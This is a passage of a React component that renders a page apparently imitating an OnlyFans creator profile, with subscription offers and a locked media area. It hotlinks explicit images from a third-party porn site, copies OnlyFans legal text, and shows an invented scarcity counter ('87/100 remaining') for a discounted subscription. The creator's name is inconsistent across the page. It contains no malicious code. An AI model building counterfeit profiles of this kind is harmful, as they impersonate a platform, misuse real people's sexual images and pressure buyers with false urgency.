      <AnimatePresence>
        {showStickyHeader && (
          <motion.div 
            initial={{ y: -60, opacity: 0 }}
            animate={{ y: showCookieBanner ? 60 : 0, opacity: 1 }}
            exit={{ y: -60, opacity: 0 }}
            className="fixed left-0 right-0 bg-white border-b border-gray-100 px-4 py-2 flex items-center justify-between z-40 shadow-sm"
          >
            <div className="flex items-center gap-4">
              <button className="p-1 hover:bg-gray-100 rounded-full transition-colors">
                <ArrowLeft size={24} />
              </button>
              <div className="flex flex-col">
                <h1 className="font-bold text-base flex items-center gap-1 leading-tight">
                  Ashley Sanz <Check size={14} className="bg-[#00aff0] text-white rounded-full p-0.5" />
                </h1>
                <div className="flex items-center gap-1.5 text-xs text-gray-400">
                  <div className="w-2 h-2 bg-[#4caf50] rounded-full" />
                  <span>Available now</span>
                </div>
              </div>
            </div>
            <div className="flex items-center gap-3">
              <button className="p-2 hover:bg-gray-100 rounded-full text-gray-600 transition-colors">
                <Star size={22} />
              </button>
              <button className="p-2 hover:bg-gray-100 rounded-full text-gray-600 transition-colors">
                <Share2 size={22} />
              </button>
              <button className="p-2 hover:bg-gray-100 rounded-full text-gray-600 transition-colors">
                <MoreHorizontal size={22} />
              </button>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Header / Cover */}
      <div className="relative h-48 sm:h-64 overflow-hidden">
        <img 
          src="https://cdni.pornpics.com/1280/3/26/82659489/82659489_019_56b1.jpg" 
          alt="Cover" 
          className="w-full h-full object-cover"
          referrerPolicy="no-referrer"
        />
        <div className="absolute top-4 left-4 flex gap-4 items-center">
          <button className="p-2 bg-black/40 rounded-full text-white backdrop-blur-sm">
            <ArrowLeft size={20} />
          </button>
          <div className="flex flex-col">
            <h1 className="text-white font-bold text-lg flex items-center gap-1 drop-shadow-md">
              Sofia Sanz <Check size={16} className="bg-[#00aff0] rounded-full p-0.5" />
            </h1>
            <div className="flex items-center gap-2 text-white/90 text-xs font-medium drop-shadow-md">
              <div className="flex items-center gap-1">
                <ImageIcon size={14} />
                <span>351</span>
              </div>
              <span className="w-1 h-1 bg-white/60 rounded-full" />
              <div className="flex items-center gap-1">
                <Video size={14} />
                <span>30</span>
              </div>
              <span className="w-1 h-1 bg-white/60 rounded-full" />
              <div className="flex items-center gap-1">
                <Heart size={14} />
                <span>97k</span>
              </div>
            </div>
          </div>
        </div>
        <div className="absolute bottom-0 left-0 w-full h-24 bg-gradient-to-t from-black/60 to-transparent" />
      </div>

      {/* Profile Section */}
      <div className="px-4 relative">
        {/* Profile Picture */}
        <div className="relative -mt-12 mb-4 inline-block">
          <div className="w-24 h-24 rounded-full border-4 border-white overflow-hidden shadow-lg">
            <img 
              src="https://cdni.pornpics.com/1280/3/26/61400560/61400560_022_80d5.jpg" 
              alt="Profile" 
              className="w-full h-full object-cover"
              referrerPolicy="no-referrer"
            />
          </div>
          <div className="absolute bottom-1 right-1 w-5 h-5 bg-[#4caf50] border-4 border-white rounded-full" />
        </div>

        {/* Share Button */}
        <button className="absolute right-4 top-4 p-2 border border-gray-200 rounded-full text-gray-600 hover:bg-gray-50 transition-colors">
          <Share2 size={20} />
        </button>

        {/* Name & Handle */}
        <div className="mb-4">
          <h2 className="text-xl font-bold flex items-center gap-1">
            Sofia Sanz <Check size={18} className="bg-[#00aff0] text-white rounded-full p-0.5" />
          </h2>
          <div className="flex items-center gap-2 text-gray-500 text-sm">
            <span>@sofiasanzz</span>
            <span className="w-1 h-1 bg-gray-300 rounded-full" />
            <span>Available now</span>
          </div>
        </div>

        {/* Bio */}
        <div className={`text-sm space-y-3 text-gray-800 leading-relaxed ${isBioCollapsed ? 'line-clamp-2' : ''}`}>
          <p> hi guys <span className="text-[#00aff0] italic font-semibold">xoxo </span> 🫣 📈</p>
          <p>FULLY NUDE CONTENT AVAILABLE VIA DMS!!! 💗</p>
          <p>.</p>
          <p>.</p>
          <p className="text-gray-500 text-xs">
            Legal: Review ALL OnlyFans Terms of Service, including Creator section. Account content is protected by US and international copyright laws. Do not use, copy, distribute, reproduce, print any account content outside of this OnlyFans page. Please reach out if you have questions. You further acknowledge and agree that this account is run by me and my team, who are authorized to respond on my behalf to any communications to ensure the best experience. By subscribing to this account and engaging in any "Fan and Creator. Copyright © 2025
          </p>
        </div>
        <button 
          onClick={() => setIsBioCollapsed(!isBioCollapsed)}
          className="text-[#00aff0] text-sm font-semibold mt-2 hover:underline"
        >
          {isBioCollapsed ? "Show more" : "Collapse info"}
        </button>
      </div>

      {/* Subscription Section */}
      <div className="mt-6 border-t border-gray-100 pt-6">
        <div className="px-4">
          <h3 className="text-gray-500 font-bold text-xs uppercase tracking-wider mb-4">SUBSCRIPTION</h3>
          
          <div className="bg-white border border-gray-200 rounded-xl overflow-hidden shadow-sm">
            <div className="p-4">
              <h4 className="font-bold text-lg mb-4">Limited offer - 70% off for 30 days!</h4>
              
              <div className="flex gap-3 mb-6">
                <img 
                  src="https://cdni.pornpics.com/1280/3/26/61400560/61400560_022_80d5.jpg" 
                  alt="Avatar" 
                  className="w-12 h-12 rounded-full object-cover shrink-0"
                  referrerPolicy="no-referrer"
                />
                <div className="bg-gray-50 rounded-xl p-3 text-sm flex-1">
                  <p className="font-medium">
                    MY BIGGEST SALE EVER!!! only for the next 100 subscribers (87)/100 remaining ‼️😉
                  </p>
                </div>
              </div>

              <motion.button 
                whileTap={{ scale: 0.98 }}
                onClick={() => setShowSubscriptionModal(true)}
                className="w-full bg-[#00aff0] text-white font-bold py-3.5 rounded-full flex items-center justify-between px-6 shadow-lg shadow-blue-100"
              >
                <span>SUBSCRIBE</span>
                <span>$3 for 30 days</span>
              </motion.button>
              
              <p className="text-gray-400 text-xs mt-3 text-center">
                Regular price $10 /month
              </p>
            </div>
          </div>
        </div>
      </div>

      {/* Subscription Bundles */}
      <div className="mt-6 px-4">
        <div className="flex items-center justify-between mb-4">
          <h3 className="text-gray-500 font-bold text-xs uppercase tracking-wider">SUBSCRIPTION BUNDLES</h3>
          <ChevronUp size={18} className="text-gray-400" />
        </div>
        
        <button 
          onClick={() => setShowSubscriptionModal(true)}
          className="w-full bg-[#00aff0] text-white font-bold py-3.5 rounded-full flex items-center justify-between px-6 shadow-md"
        >
          <span>3 MONTHS (15% off)</span>
          <span>$25.50 total</span>
        </button>
      </div>

      {/* Tabs */}
      <div className="mt-8 border-b border-gray-200">
        <div className="flex">
          <button 
            onClick={() => setActiveTab("posts")}
            className={`flex-1 py-4 text-sm font-bold uppercase tracking-wider relative transition-colors ${activeTab === "posts" ? "text-gray-900" : "text-gray-400"}`}
          >
            241 POSTS
            {activeTab === "posts" && (
              <motion.div layoutId="activeTab" className="absolute bottom-0 left-0 w-full h-0.5 bg-gray-900" />
            )}
          </button>
          <button 
            onClick={() => setActiveTab("media")}
            className={`flex-1 py-4 text-sm font-bold uppercase tracking-wider relative transition-colors ${activeTab === "media" ? "text-gray-900" : "text-gray-400"}`}
          >
            381 MEDIA
            {activeTab === "media" && (
              <motion.div layoutId="activeTab" className="absolute bottom-0 left-0 w-full h-0.5 bg-gray-900" />
            )}
          </button>
        </div>
      </div>

      {/* Locked Content Area */}
      <div className="py-20 flex flex-col items-center justify-center text-gray-300 relative overflow-hidden">
        {/* Subtle background pattern */}
        <div className="absolute inset-0 opacity-[0.03] pointer-events-none flex items-center justify-center">
          <Lock size={400} />
        </div>

        <div className="relative z-10 flex flex-col items-center">
          <div className="bg-gray-50 p-6 rounded-full mb-8">
            <Lock size={64} className="text-gray-200" />
          </div>
          
          <div className="flex gap-4 text-xs font-bold text-gray-400 mb-8 border border-gray-100 rounded-lg p-2 px-4">
            <div className="flex items-center gap-1.5">
              <FileText size={14} /> 241
            </div>
            <div className="flex items-center gap-1.5">
              <ImageIcon size={14} /> 351
            </div>
            <div className="flex items-center gap-1.5">
              <ImageIcon size={14} className="rotate-90" /> 30
            </div>
            <Lock size={14} className="ml-2" />
          </div>

          <motion.button 
            whileHover={{ scale: 1.02 }}
            whileTap={{ scale: 0.98 }}
            onClick={() => setShowSubscriptionModal(true)}
            className="bg-[#00aff0] text-white font-bold py-3.5 px-10 rounded-full shadow-xl shadow-blue-100 uppercase tracking-wide text-sm"
          >
            Subscribe to see user's posts
          </motion.button>
        </div>
      </div>

      {/* Bottom Navigation */}
      <div className="fixed bottom-0 left-0 w-full bg-white border-t border-gray-100 px-8 py-4 flex justify-between items-center z-50">
        <button className="text-gray-400 hover:text-[#00aff0] transition-colors">
          <Home size={28} />
        </button>
        <button className="text-gray-400 hover:text-[#00aff0] transition-colors">
          <MoreHorizontal size={28} />
        </button>
      </div>
    </div>
  );
}
